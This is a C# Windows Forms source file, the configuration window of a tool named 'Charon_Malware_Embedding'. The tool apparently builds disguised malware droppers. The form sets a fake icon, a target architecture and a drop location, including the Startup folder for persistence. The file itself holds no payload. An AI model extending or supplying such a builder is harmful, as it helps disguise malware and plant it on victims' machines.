using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace Charon_Malware_Embedding
{
    public partial class ConfigurationWindow : Form
    {
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HTCAPTION = 0x2;

        [DllImport("User32.dll")]
        public static extern bool ReleaseCapture();

        [DllImport("User32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

        public ConfigurationWindow()
        {
            InitializeComponent();
        }

        private void panel2_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HTCAPTION, 0);
            }
        }

        private void Close_btn_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            openFileDialog1.Multiselect = false;
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                foreach (string filePath in openFileDialog1.FileNames)
                {
                    Iconpath.Text = filePath;
                }
            }
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (comboBox1.Text == "%CUSTOM%")
            {
                CustomPath.Visible = true;
            }
            else
            {
                CustomPath.Visible = false;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (comboBox1.Text == " " | comboBox1.Text == "" | comboBox1.Text == "  " | comboBox1.Text == null)
            {
                MessageBox.Show("The `drop files in` is empty. Please select from options", "ERROR Select Directory To Drop File", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;

            }
            else if (Iconpath.Text == "" | Iconpath.Text == " " | Iconpath.Text == " " | Iconpath.Text == null)
            {
                MessageBox.Show("The `Icon Path` is empty. Please select Icon File", "ERROR Select Icon File", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;

            }
            else if (comboBox2.Text == "" | comboBox2.Text == " " | comboBox2.Text == " " | comboBox2.Text == null)
            {
                MessageBox.Show("Please Select EXE Architecture", "ERROR Select Architecture", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }


            if (comboBox1.Text == "%TEMP%")
            {

                Config.DroppedFileIn = Config.TempPath;

            }
            else if (comboBox1.Text == "%APPDATA%")
            {
                //Utils.WriteToFile(Config.templatePathCreation, Config.AppdataPath);
                Config.DroppedFileIn = Config.AppdataPath;
            }
            else if (comboBox1.Text == "%LOCALAPPDATA%")
            {
                //Utils.WriteToFile(Config.templatePathCreation, Config.LocalAppdataPath);
                Config.DroppedFileIn = Config.LocalAppdataPath;
            }
            else if (comboBox1.Text == "%USERPROFILE%")
            {
                //Utils.WriteToFile(Config.templatePathCreation, Config.UserProfilePath);
                Config.DroppedFileIn = Config.UserProfilePath;
            }
            else if (comboBox1.Text == "%%STARTUP%%")
            {
                //Utils.WriteToFile(Config.templatePathCreation, Config.StartUpPath);
                Config.DroppedFileIn = Config.StartUpPath;
            }
            else if (comboBox1.Text == "%CUSTOM%")
            {
                Config.DroppedFileIn = $"Path={CustomPath.Text}";
                //Utils.WriteToFile(Config.templatePathCreation, $"Path={CustomPath.Text}");
            }
            else
            {
                MessageBox.Show("Please select valid options", "ERROR Select INVALID OPTION", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }


            if (Iconpath.Text != null)
            {
                if (File.Exists(Iconpath.Text))
                {
                    Config.IconPath = Iconpath.Text;
                }
                else
                {
                    MessageBox.Show("Please select valid Icon File Path", "ERROR Select INVALID ICONPATH", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
                
            }

            if (comboBox2.Text != null)
            {
                Config.OptationSystem = comboBox2.Text;
            }


            if (MessageBox.Show("Successfully Configuration Changed.", "INFO", MessageBoxButtons.OK, MessageBoxIcon.Information) == DialogResult.OK)
            {
                this.Close();
            }
        }
    }
}
